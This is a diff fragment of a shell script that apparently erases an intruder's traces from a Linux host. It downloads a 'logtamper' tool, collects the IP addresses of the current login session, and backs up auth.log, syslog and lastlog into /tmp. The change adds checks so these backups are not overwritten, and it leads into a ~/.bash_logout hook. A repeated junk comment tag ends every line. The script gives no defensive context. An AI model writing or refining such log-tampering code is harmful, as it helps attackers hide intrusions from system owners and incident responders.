@@ -74,9 +74,15 @@ if [ !  -f $clear_shell ];then #_fdsagadsfasdgadsgsss
     gglog "Download logtamper ok" #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
 last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips #_fdsagadsfasdgadsgsss
+if [ ! -f  /tmp/auth.log ];then #_fdsagadsfasdgadsgsss
 _bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
+if [ ! -f  /tmp/syslog ];then #_fdsagadsfasdgadsgsss
 _bak /var/log/syslog; #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
+if [ ! -f  /tmp/lastlog ];then #_fdsagadsfasdgadsgsss
 _bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
+fi #_fdsagadsfasdgadsgsss
 gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
 gglog "${UNDERLINE}ip:$(cat $my_ips | xargs) pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
 if [ ! -f ~/.bash_logout ];then #_fdsagadsfasdgadsgsss
